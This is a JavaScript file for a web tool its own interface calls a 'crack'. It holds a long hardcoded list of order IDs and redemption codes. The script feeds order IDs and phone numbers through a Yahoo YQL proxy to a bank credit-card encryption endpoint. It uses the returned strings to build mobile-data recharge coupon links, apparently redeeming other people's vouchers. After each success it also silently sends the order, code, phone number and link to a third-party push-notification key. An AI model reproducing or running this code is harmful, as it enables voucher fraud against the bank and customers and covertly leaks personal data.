var bannedKeys = ["aXJzdHRlc3Q="];
var myList = [];
var usedList = [];
var preset = [
"EO2017090603036595248@03b06516c5f4@",
"EO2017083003036459317@ade826931312@",
"EO2017082303036389412@e76160e945b7@",
"EO2017082303036383440@e300b0473b60@",
"EO2017082303036386433@bd1f4fcd6ff6@",
"EO2017090603036591302@02a3266cc360@",
"EO2017083003036457411@fa086aeaa8db@",
"EO2017090603036596111@e18079a4457a@",
"EO2017091303036664117@057d9b04311d@",
"EO2017091303036657648@bc23548ada50@",
"EO2017081603036214924@f8fa2d368d6c@",
"EO2017091303036664319@abfba6c6dd16@",
"EO2017091303036658408@b26aca902283@",
"EO2017091303036660492@db653f67ab77@",
"EO2017091303036661495@05bfa232fd8f@",
"EO2017091303036656521@06a996738a64@",
"EO2017091303036662530@bc8f338b2a75@",
"EO2017091303036655565@f9b1a5724718@",
"EO2017091303036660417@b67d3a4f6334@",
"EO2017091303036664146@ef9de0d97a46@",
"EO2017091303036659550@e81390d62eb8@",
"EO2017091303036659535@05b8767e88c3@",
"EO2017091303036655582@07686a0f53c0@",
"EO2017091303036663315@cb85d2d6d878@",
"EO2017091303036660394@ad8baf371140@",
"EO2017091303036660494@d9d86931f747@",
"EO2017091303036656553@c6290dbf63f8@",
"EO2017091303036663352@fd7ca329b10b@",
"EO2017091303036661413@ea8f5b673e0a@",
"EO2017091303036664968@bb01b9abc68d@",
"EO2017091303036657576@bbe4a3a4101f@",
"EO2017091303036662490@e8e453edf931@",
"EO2017081603036260409@fd9184ac1921@",
"EO2017080203036056422@820d8f078101@",
"EO2017072603035985931@664d7fd49ac7@",
"EO2017091303036662560@fa4925015061@",
"EO2017081603036227963@c9392aa796e2@",
"EO2017091303036658515@ca7d5e3d97ee@",
"EO2017091303036662551@d971add0fdfe@",
"EO2017091303036661547@ea3df1bca590@",
"EO2017091303036662537@05bea9e1fe84@",
"EO2017091303036655631@069af966ccb3@",
"EO2017091303036655642@0652945ea997@",
"EO2017091303036655656@a99096f70da0@",
"EO2017091303036663467@e5d33a6bc131@",
"EO2017091303036661484@0518b5db120e@",
"EO2017091303036664320@bd16065850c0@",
"EO2017091303036659496@077a865f7b64@",
"EO2017091303036661506@b61fef198b6e@",
"EO2017091303036661453@eba48502e4c0@",
"EO2017091303036658520@0582610bb8cb@",
"EO2017091303036655553@0646d0ae4534@",
"EO2017091303036659443@b1d5d7d3e60f@",
"EO2017091303036664175@b2ecb4e12fa7@",
"EO2017091303036655647@b4cdd23c5dc1@",
"EO2017091303036655657@bd7754e8b4b@",
"EO2017091303036658505@0694a67fc7c2@",
"EO2017091303036664292@0524f2ee8b61@",
"EO2017090603036588366@01f57f03a2f5@",
"EO2017091303036656500@06cf711c9109@",
"EO2017091303036661490@06bab4414d5b@",
"EO2017091303036658446@05af083ea2cc@",
"EO2017091303036659420@d0c3faddd08c@",
"EO2017091303036661543@b031b3fec33d@",
"EO2017091303036660478@0694b839efba@",
"EO2017091303036664287@052bed7c69cb@",
"EO2017091303036656503@b5d281ac9e66@",
"EO2017091303036658435@c3b3103555f4@",
"EO2017091303036661437@ec0f6b794872@",
"EO2017091303036655689@076dc7518936@",
"EO2017091303036662528@bbf79d589b9c@",
"EO2017091303036664979@be8604100baa@",
"EO2017081603036228942@a5b7b50a9489@",
"EO2017091303036664206@e3c9d15a42b3@",
"EO2017091303036656572@05dd39aa5d00@",
"EO2017091303036659519@06a4b4913a18@",
"EO2017091303036663288@d93c5365c383@",
"EO2017091303036657577@d64ccf1bd396@",
"EO2017091303036659518@a8767a78f86b@",
"EO2017091303036660430@06ce6439c598@",
"EO2017091303036663345@ab1a3095bc01@",
"EO2017091303036662353@cd4c2692b8d1@",
"EO2017091303036660519@cd83deb475c3@",
"EO2017091303036659499@d8f0407d86e9@",
"EO2017062103034918064@a96ad39d88d9@",
"EO2017081603036214201@dd8a404c2dcb@",
"EO2017091303036662380@f1fc55f2f971@",
"EO2017091303036655627@061a6e5f0ba8@",
"EO2017091303036658425@ee403112ddd3@",
"EO2017091303036662363@e1373637f0b6@",
"EO2017091303036662346@fecdaa9eec94@",
"EO2017091303036657541@eb8d89ed2e80@",
"EO2017091303036664265@0789c8ade135@",
"EO2017091303036662413@b3655915dda1@",
"EO2017091303036663303@b50e01e4a455@",
"EO2017091303036664158@aa339ce4a4cc@",
"EO2017091303036661540@e9dea9143147@",
"EO2017091303036659386@b55a3a6fc193@",
"EO2017091303036663375@06ed1afc79e6@",
"EO2017091303036663246@c787d5654c62@",
"EO2017091303036663409@078dc9192713@",
"EO2017091303036659366@aece3de00c76@",
"EO2017060703034389673@a9e5e58d350d@",
"EO2017082303036389712@ea48299445ab@",
"EO2017081603036214970@ea10445cb257@",
"EO2017091303036663355@077415962df0@",
"EO2017080203036054169@7611d6c77d4e@",
"EO2017091303036663458@f9493d44efde@",
"EO2017070503035288662@192b126646e9@",
"EO2017091303036664331@b8c8544ba009@",
"EO2017090603036596102@ee92abc53cdb@",
"EO2017091303036664805@ab33670d0787@",
"EO2017081603036230209@d36ada4b4b0b@",
"EO2017091303036661460@a92b73269f85@",
"EO2017091303036655624@ae59c703ce57@",
"E02017080203036053600@81c49c1eedb7@",
"EO2017091303036658370@ed29cfe6507c@",
"EO2017061403034689769@57e590da8433@",
"EO2017091303036661560@c4cadedc54a5@",
"EO2017091303036655697@fc99088b2e7f@",
"EO2017080903036127410@99288301a925@",
"EO2017091303036657511@d2b32b6f0694@",
"EO2017091303036657475@ce9c52d9aa32@",
"EO2017091303036661374@ebdc4b48e175@",
"EO2017091303036658541@e8e3daeb2118@",
"EO2017091303036659439@cf271287b8c9@",
"EO2017071203035502973@3eda221fff50@",
"EO2017091303036658368@dd4a967e4ae2@",
"EO2017081603036228339@e3e2a961e146@",
"EO2017091303036658371@b45ef7b4ecb4@",
"EO2017091303036658386@d5715de8df21@",
"EO2017091303036660410@05f60bbe2cca@",
"EO2017091303036659450@07092282fdaa@",
"EO2017091303036657547@c309a0691702@",
"EO2017091303036658443@e6108d6f8f4f@",
"EO2017091303036660427@07038bf7fb72@",
"EO2017091303036661403@07ac2dc6ad1d@",
"EO2017082303036383404@cfd34217c304@",
"EO2017091303036660491@064fd3132e9b@",
"EO2017091303036655691@06460f79f83f@",
"EO2017091303036661436@0622a31baf71@",
"EO2017091303036662440@065fc3556a4b@",
"EO2017091303036658441@06a6e7ebaa49@",
"EO2017091303036658454@f0e7440e81fc@",
"EO2017091303036664293@060a080f46e6@",
"EO2017091303036664179@069655ae46fa@",
"EO2017091303036662556@059aa759fa1a@",
"EO2017091303036664888@0591dbc645b0@",
"EO2017091303036655593@0620d8e4de6c@",
"EO2017091303036658581@af1aaf292fce@",
"EO2017091303036657615@066b62752d59@",
"EO2017091303036658424@0672b3b6a4a6@",
"EO2017091303036664279@06c157b81f2d@",
"EO2017091303036655639@063c66d532a9@",
"EO2017091303036657652@c981ba7271a5@",
"EO2017091303036656560@beee409ca9ef@",
"EO2017091303036656516@c816d11b3b09@",
"EO2017091303036664324@ddcb39ed3699@",
"EO2017091303036658593@b4ab6802f6e0@",
"EO2017091303036660443@c0706c6b284b@",
"EO2017091303036655704@b8c42477ebd5@",
"EO2017091303036661473@e2a3bb0739e5@",
"EO2017091303036663433@ae331b460408@",
"EO2017091303036656613@069d183aceed@",
"EO2017091303036655681@060f96405fc5@",
"EO2017091303036662419@d5e83b5aae37@",
"EO2017091303036659524@f5d9e7ae3529@",
"EO2017091303036660544@05a27c937394@",
"EO2017091303036659488@be04ae2dade9@",
"EO2017091303036664864@d8f10655ba77@",
"EO2017091303036658487@bb7d935117e2@",
"EO2017091303036655693@e0eedfba50f8@",
"EO2017091303036662542@c64fd56dd6cf@",
"EO2017091303036658597@afea8b88c1d3@",
"EO2017091303036662422@d05058452243@",
"EO2017083003036460012@ff879c2ecd68@",
"EO2017091303036664283@ecfe5249303e@",
"EO2017091303036664971@c785aa09dcc3@",
"EO2017091303036663340@064392baa340@",
"EO2017091303036656615@d8f9110131d5@",
"EO2017091303036663469@b1f476adef70@",
"EO2017091303036656467@cba655f6ecca@",
"EO2017091303036664796@cbc10c630625@",
"EO2017091303036662357@c666ec206ffa@",
"EO2017091303036656642@0761d7c5f4e1@",
"EO2017091303036664945@e3966f3fdccf@",
"EO2017091303036656617@cbbd1e2c53d2@",
"EO2017091303036664301@a9ac71a68af7@",
"EO2017091303036656573@cfa3c290da0c@",
"EO2017091303036661564@0769a2cc1f2a@",
"EO2017091303036660597@aad9fec81c1b@",
"EO2017091303036656612@f0f9ba11b6a7@",
"EO2017091303036662553@db59c8e2b507@",
"EO2017091303036661447@06b097b5c4d3@",
"EO2017091303036659436@fa4db3f84cfd@",
"EO2017091303036660565@b4f5545ccd8a@",
"EO2017091303036659466@f803b6431210@",
"EO2017091303036663464@05b06758a2e5@",
"EO2017091303036658610@e1cbce664d57@",
"EO2017091303036664253@ff1273942bee@",
"EO2017091303036663305@ae298d4f8b88@",
"EO2017091303036663466@e51c39dfe170@",
"EO2017090603036591938@f13a4549beac@",
"EO2017091303036657582@ca4e1d9547d8@",
"EO2017091303036659402@c008ba6e7061@",
"EO2017091303036664240@068298c35a01@",
"EO2017091303036661406@edfb61d84e90@",
"EO2017091303036656510@e9d34494d54a@",
"EO2017091303036655625@06d5626888bb@",
"EO2017090603036592245@cc784cab9ab2@",
"EO2017090603036590305@03dc9bdc83ce@",
"EO2017091303036661537@b8d46e1be0a9@",
"EO2017091303036664944@f747dc622f7c@",
"EO2017091303036663251@bcfca0acae47@",
"EO2017091303036659370@af10f808192b@",
"EO2017091303036660520@06e677202c4c@",
"EO2017091303036661561@d88bdaca8988@",
"EO2017091303036656594@dcfa9f536257@",
"EO2017091303036661538@e85899353072@",
"EO2017091303036664977@d7e2dc41ba1f@",
"EO2017091303036661442@e90fc72b2694@",
"EO2017091303036656528@b5342dfeea23@",
"EO2017091303036664314@d47f183d73ed@",
"EO2017091303036662480@076fb824e5c9@",
"EO2017091303036656645@05b8e8ba6049@",
"EO2017091303036662474@f49c7e22e2b0@",
"EO2017091303036661548@06306b0378ed@",
"EO2017091303036664871@078acfb82a0e@",
"EO2017091303036655661@06a813cdf4fe@",
"EO2017072603035987146@6ca0c53b81dc@",
"EO2017091303036662417@078b6bedae7d@",
"EO2017091303036663296@f0a5302b133e@",
"EO2017091303036661467@b8fe1bd96b67@",
"EO2017091303036657668@dfec489ca4b2@",
"EO2017091303036662379@fddd96acac69@",
"EO2017091303036660389@ed73061d11c8@",
"EO2017091303036658418@ed4707ec13dc@",
"EO2017091303036655571@e7946f0bbee5@",
"EO2017091303036658412@de0206f59806@",
"EO2017091303036658459@c2bd9de87db2@",
"EO2017091303036655716@f2de7024a535@",
"EO2017091303036662488@06ee08999c0b@",
"EO2017091303036657568@06e42c5478f9@",
"EO2017091303036664231@ff2cdf055a3f@",
"EO2017091303036659560@06f0b91f0018@",
"EO2017081603036214011@db516fedd18e@",
"EO2017091303036661512@b21b7f53cda4@",
"EO2017091303036658464@079621395378@",
"EO2017091303036655712@eb65a96bb68a@",
"EO2017091303036664088@0758fffc77ac@",
"EO2017072603035982034@6acc061532e0@",
"EO2017091303036664836@f4476401d9bb@",
"EO2017091303036664321@07a4dce08681@",
"EO2017091303036658400@a91f84803f40@",
"EO2017091303036659563@059b704cb993@",
"EO2017091303036656533@f8cb25af2020@",
"EO2017091303036656569@e0e5cb2d685e@",
"EO2017091303036663365@070186b3fac8@",
"EO2017091303036664288@afe56006914e@",
"EO2017091303036660560@e6900c8c91ea@",
"EO2017091303036660536@da634b694569@",
"EO2017091303036659415@ded69e111286@",
"EO2017091303036661435@e7ca006c633e@",
"EO2017091303036660399@0628ce2dfc2d@",
"EO2017091303036655579@a89b0f61825e@",
"EO2017091303036656570@c2a581ec7b89@",
"EO2017091303036656563@ffbcaa6030c2@",
"EO2017091303036662434@f891da1e0ffa@",
"EO2017091303036664153@0645254842d7@",
"EO2017091303036655616@0687d05c599b@",
"EO2017091303036660577@e72a7bd705d8@",
"EO2017091303036664268@e0c1375c7890@",
"EO2017082303036379457@ca08ad168733@",
"EO2017081603036224066@efecfb3596d6@",
"EO2017091303036662541@ab915dd89489@",
"EO2017091303036660566@075bb6837113@",
"EO2017080903036133916@9934eaa6ef24@",
"EO2017080203036055989@8c7868486a1b@",
"EO2017072603035985742@60dc23289b0f@",
"EO2017070503035288753@223f02b739b6@",
"EO2017091303036659434@b62fd29a466e@",
"EO2017091303036664892@bac7510104da@",
"EO2017091303036659429@c27a3ee84428@",
"EO2017091303036660586@dc7c55cd6d06@",
"EO2017091303036661365@077fde02922d@",
"EO2017090603036591224@c76b4ee22db2@",
"EO2017081603036228303@cfad32e5a315@",
"EO2017091303036664831@d8acda443a6d@",
"EO2017091303036656461@06edc6d78fff@",
"EO2017090603036597053@02a8d43cc44f@",
"EO2017091303036655558@b7da6e1f754b@",
"EO2017072603035985837@6448d6abb57f@",
"EO2017091303036660473@05f40aec0c11@",
"EO2017091303036657558@075f25c8db5d@",
"EO2017090603036593055@036386e4a967@",
"EO2017082303036387551@eb818f81d8ad@",
"EO2017091303036664984@cc514d0398f0@",
"EO2017091303036662376@c5edb56f4588@",
"EO2017081603036228233@caa12e2cf5f3@",
"EO2017072603035991834@6978f77fd741@",
"EO2017091303036662395@ce8ae456a057@",
"EO2017091303036658429@ac198ed8b32a@",
"EO2017083003036459248@dd6eac84e17b@",
"EO2017091303036661498@e384c9bb6280@",
"EO2017090603036591372@f76ce85f8670@",
"EO2017083003036457415@cf582d207cf5@",
"EO2017090603036597085@b60c790514ce@",
"EO2017080903036133938@92b30d8ad16d@",
"EO2017082303036381425@f6115fe1b52f@",
"EO2017091303036658614@d48545fcbfc3@",
"EO2017090603036590386@f738f9274360@",
"EO2017083003036465765@d1eb8d449e65@",
"EO2017082303036382666@e4bc5e7a7794@",
"EO2017081603036214047@a7d489a1c590@",
"EO2017052403034085445@05a3eb05e2ff@",
"EO2017091303036657661@bad77f921bf2@",
"EO2017062103034901058@9b2f7ea58f60@",
"EO2017061403034675877@4b2e40de0b70@",
"EO2017091303036663450@f8b1b27ccb42@",
"EO2017082303036380334@bada661cdf49@",
"EO2017091303036663291@aaa059a801a9@",
"EO2017083003036456248@dd8ebf69fa24@",
"EO2017091303036659468@ee1fddcf5fea@",
"EO2017082703036431593@a797354ba18e@",
"EO2017081603036228057@cbd315069929@",
"EO2017053103034152173@327449234970@",
"EO2017052403034094405@ea1960dd5795@",
"EO2017091303036663247@c416b48a22a2@",
"EO2017081603036228304@f1fc2863ee0f@",
"EO2017091303036661411@b26665a56020@",
"EO2017091303036663252@ae6da9edcca7@",
"EO2017071903035753309@573f7c8814d5@",
"EO2017091303036664100@cdeaa7ac0db2@",
"EO2017091303036664104@06f6fd1c07e1@",
"EO2017082303036386394@fb0f91c8a2b9@",
"EO2017083003036458089@b99a14966c33@",
"EO2017091303036664808@eade18d7ca73@",
"EO2017060703034429529@5d65f2f7992c@",
"EO2017071903035744103@5c12a6e35c5e@",
"EO2017091303036663310@ec4bdb7a6624@",
"EO2017091303036664266@07a52ce6d544@",
"EO2017091303036658552@068101a29916@",
"EO2017091303036661457@f3d0d5a4f659@",
"EO2017090603036588263@e14940936256@",
"EO2017091303036664232@05bc05cf4aab@",
"EO2017091303036664924@c8bc2c4593ae@",
"EO2017091303036657579@b44dc7a7e8bf@",
"EO2017091303036664261@bf155019c0b4@",
"EO2017091303036661514@d63fd7d40dcc@",
"EO2017091303036662502@cb579062fd7c@",
"EO2017091303036664937@ab34245e1e82@",
"EO2017091303036660506@051d6d03c643@",
"EO2017091303036657680@d8127816e0de@",
"EO2017091303036658477@0597fb370b39@",
"EO2017091303036663457@af4e9471fd6a@",
"EO2017091303036663432@f45ccedead67@",
"EO2017091303036658462@dfa025d358ea@",
"EO2017091303036659455@b2eab32ccfeb@",
"EO2017091303036660511@fde659ac2d05@",
"EO2017091303036664897@c34f4fdebf20@",
"EO2017091303036655645@e348fb62c104@",
"EO2017091303036664980@b44c5515631e@",
"EO2017091303036664296@bebd147c5322@",
"EO2017091303036659553@063d314867da@",
"EO2017091303036657537@d2e80e73df60@",
"EO2017090603036593980@01b6e2ed1390@",
"EO2017091303036658495@d0588d9a9bdb@",
"EO2017091303036659520@da8ebea7ae8b@",
"EO2017091303036660425@e2129b24c36b@",
"EO2017091303036660422@fd2f733e3ee9@",
"EO2017091303036660429@ef8f45cfb038@",
"EO2017091303036656622@b27652447b2c@",
"EO2017091303036662504@0794d1484a76@",
"EO2017091303036658590@e53324c8db67@",
"EO2017091303036660574@bae343b17280@",
"EO2017091303036663343@a9b0fa5e0e42@",
"EO2017091303036656656@079c85a4c178@",
"EO2017091303036664961@07a5c30efdf4@",
"EO2017091303036664969@f6488a7d56ab@"  // 20170908 23:09
]
var showIn = function(){
  $("#in").append("<input type=text class=form-control id=orderId placeholder=订单号> <input type=text class=form-control id=mobile placeholder=手机号><input type=text class=form-control id=code placeholder=兑换码><textarea id=preset class=form-control placeholder='预设订单和兑换码，以便快速获取地址。格式为 订单号@兑换码@手机号 如 EO2017082303123456789@abcdefg@13588888888 一行一条数据' style='height:200px'></textarea><textarea id=result class=form-control placeholder='破解结果(更新日期2017-09-09-13 13:40)' style='height:200px'></textarea>");
  $("#yql").attr("onclick", "getEnc()");
  localStorage.preset = removeUsed(preset).join("\r\n");
  $("#preset").val(localStorage.preset);
}

var removeUsed = function(){
 if(!localStorage.used){
     localStorage.used = usedList;
    }else{
     usedList = localStorage.used.split(",");
    }
 var result = [];
 preset.forEach(function(code){
  if(usedList.indexOf(code) == -1){
   result.push(code);
  }
 });
 return result;
}

var check = function() {
  if (bannedKeys.indexOf(uk) === -1) {
    return true;
  }else{
    alert("请用新版~");
    return false;
  }
}

var readLine = function(){
  var text = $("#preset").val();
  localStorage.preset = text;
  if(text.length > 0){
    var lines = text.split("\n");
    var pre = lines.pop().trim();
    $("#preset").val(lines.join("\n"));
    localStorage.preset = $("#preset").val();
    return pre.indexOf("@") > -1 ? pre.split("@") : [];
  }else{
    return [];
  }
}

var getEnc = function(retry){
  var valid = check();
  if(valid){
    $("#yql").text("正在获取...");
    $("#yql").attr("disabled", "disabled");
    if(!retry){
     var pre = readLine();
     if(pre.length === 3){
      $("#orderId").val(pre[0].trim()); 
      $("#code").val(pre[1].trim());
      $("#mobile").val(pre[2].trim()); 
     }
    }
    var mobile = $("#mobile").val().trim();
    var orderId = $("#orderId").val().trim();
    if(mobile && orderId){
      var u = 'https://prefacty.creditcard.cmbc.com.cn/mmc-main-webapp/main/TDESEncryptByCMBCC.json?paramMap={"orderId":"'+orderId+'","mobile":"'+mobile+'"}';
      $.ajax({
          url: "https://query.yahooapis.com/v1/public/yql",
          dataType: "json",
          timeout: 10000,
          data: {
              format: "json",
              q: $("#yql").data("ql") + encodeURI(u) + $("#yql").data("qr")
          },
          success: getUrl,
          error: function(c, u) {
              alert("错误 如果多次尝试无果请联系开发者");
              $("#yql").removeAttr("disabled");
          }
      });
    }else{
      alert("缺少数据");
      $("#yql").removeAttr("disabled"); 
    }
  }
}

var getUrl = function(data){
  $("#yql").removeAttr("disabled");
  if(data.query){
    var re = data.query.results;
    if(re){
      var str = re.reply.enStr;
      var mobile = $("#mobile").val().trim();;
      var code = $("#code").val().trim();;
      var orderId = $("#orderId").val().trim();;
      usedList.push(orderId + "@" + code + "@");
      localStorage.used = usedList;
      var u = "http://ms.lefone.cn/msflowday/couponShowController/showCoupon.do?enStr=" + encodeURIComponent(str);
      var result = "订单：" + orderId + " 码：" + code + " 手机号：" + mobile + " 充值链接：" + u;
      var extra = " 2款" + orderId;
      if(myList.indexOf(orderId) > -1){
        extra = " 14款" + orderId;
      }
      $.get("https://pushbear.ftqq.com/sub?sendkey=751-9616f3ff7deb3cdfda6f4f547ab5b153&text=流量充值"+extra+"&desp=" + result)
      $("#result").val(result);
      $("#yql").text("成功 点击继续获取");
      $("#mobile").val("");
      $("#code").val("");
      $("#orderId").val("");
    }else{
     setTimeout(function(){
      getEnc(true);
     }, 5000)
    }
  }else{
    alert("错误 如果多次尝试无果请联系开发者");
  }
}
